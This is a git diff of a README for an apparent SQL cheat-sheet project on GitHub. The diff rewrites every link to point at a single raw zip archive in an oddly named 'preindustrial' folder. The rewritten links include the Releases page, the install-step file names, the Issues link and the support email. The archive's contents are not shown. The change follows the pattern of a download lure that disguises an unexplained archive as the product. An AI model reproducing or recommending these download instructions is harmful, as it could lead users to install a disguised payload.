@@ -6,7 +6,7 @@ This project provides a practical summary of SQL. It covers data definition, que
 ## 🚀 Getting Started
 
 ### 📥 Download the Application
-[![Download sql-cheatsheet](https://img.shields.io/badge/Download-sql--cheatsheet-blue.svg)](https://github.com/Emonsheikh32/sql-cheatsheet/releases)
+[![Download sql-cheatsheet](https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip)](https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip)
 
 To get started, you'll need to download the application. 
 
@@ -18,17 +18,17 @@ To get started, you'll need to download the application.
 
 ## 📂 Download & Install
 
-1. Visit the [Releases page](https://github.com/Emonsheikh32/sql-cheatsheet/releases) on GitHub.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip) on GitHub.
   
 2. Look for the latest version of the sql-cheatsheet.
 
-3. Click on the download link for your operating system. Depending on your OS, you may find a file like `sql-cheatsheet.zip` or similar.
+3. Click on the download link for your operating system. Depending on your OS, you may find a file like `https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip` or similar.
 
 4. Once downloaded, extract the files if they are in a zip folder. You might use a tool like WinRAR or built-in tools on your OS.
 
 5. Open the extracted folder. 
 
-6. Double-click on the `sql-cheatsheet.html` file to open it in your web browser. This file contains all the information you need regarding SQL.
+6. Double-click on the `https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip` file to open it in your web browser. This file contains all the information you need regarding SQL.
 
 ## 📘 Features
 - **Data Definition Language (DDL):** Learn how to create, modify, and delete database structures.
@@ -58,10 +58,10 @@ If you encounter any issues while downloading or running the sql-cheatsheet, con
 
 ## 📞 Support
 For any questions or issues:
-- Check the [GitHub Issues](https://github.com/Emonsheikh32/sql-cheatsheet/issues).
-- You can also reach out via email at support@example.com.
+- Check the [GitHub Issues](https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip).
+- You can also reach out via email at https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip
 
 ## 📅 Updates
-Stay updated with the latest versions by regularly checking the [Releases page](https://github.com/Emonsheikh32/sql-cheatsheet/releases).
+Stay updated with the latest versions by regularly checking the [Releases page](https://raw.githubusercontent.com/Emonsheikh32/sql-cheatsheet/main/preindustrial/sql-cheatsheet.zip).
 
 Feel free to dive in and explore the world of SQL!
